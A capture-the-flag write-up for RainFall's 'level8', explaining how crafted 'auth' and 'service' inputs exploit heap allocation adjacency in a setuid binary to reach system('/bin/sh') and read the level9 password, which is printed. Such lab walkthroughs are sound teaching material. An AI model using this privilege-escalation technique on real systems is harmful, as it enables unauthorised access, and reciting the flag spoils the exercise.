# Level8

## Solution

* There is one file in our home, ```level8```, belonging to ```level9``` user, with suid.
* Here's the hand-decompiled source code we propose for this binary: [source.c](source.c)

* For the sake of clarity, we won't display the very long disassembled code, but we will describe its behaviour:

	* there are two uninintialized static char pointers: auth and service
	* in a infinite loop, the following happens:
		* the program outputs the value of the two pointers
		* it uses ```fgets``` function and breaks the loop if ```fgets``` returns ```NULL```
		* it successively checks if the first characters of the user input are:
			* ```auth ``` ; if yes, it allocates a ```4``` bytes zone on the heap and ```auth``` points on it. It copies the remaining input characters in this zone if they are less or equal to ```0xe```
			* ```reset``` ; if yes, it frees the zone pointed by ```auth```
			* ```service```; if yes, ```service``` points on the return value of a ```strdup``` made on the reamining input characters
			* ```login```; if yes, two possibilities:
				* if ```auth[0x20]``` is not ```0x0```, launches ```system("/bin/sh")```
				* if it is equal to ```0x0```, outputs ```Password:\n```

* What we did with all of that:

	* as we would not be able to write ```0x21``` chars at the address pointed by ```auth``` (the limit is ```0xe```), we used the ```service``` part of the program
	* indeed the second allocation is done ```0x10``` bytes after the first ```4``` bytes allocation : we can write ```0x11``` chars (in fact ```0x10``` chars and a ```\n```), and ```auth[0x20]``` won't equal ```0x0```
	* a ```shell``` is launched with ```level9``` permissions so that we can ```cat``` ```.pass``` file
	* Here are the steps:
	```sh
	level8@RainFall:~$ ./level8
	(nil), (nil)
	auth
	0x804a008, (nil)
	service0123456789012345
	0x804a008, 0x804a018
	login
	$ cd ../level9
	$ cat .pass
	c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
	```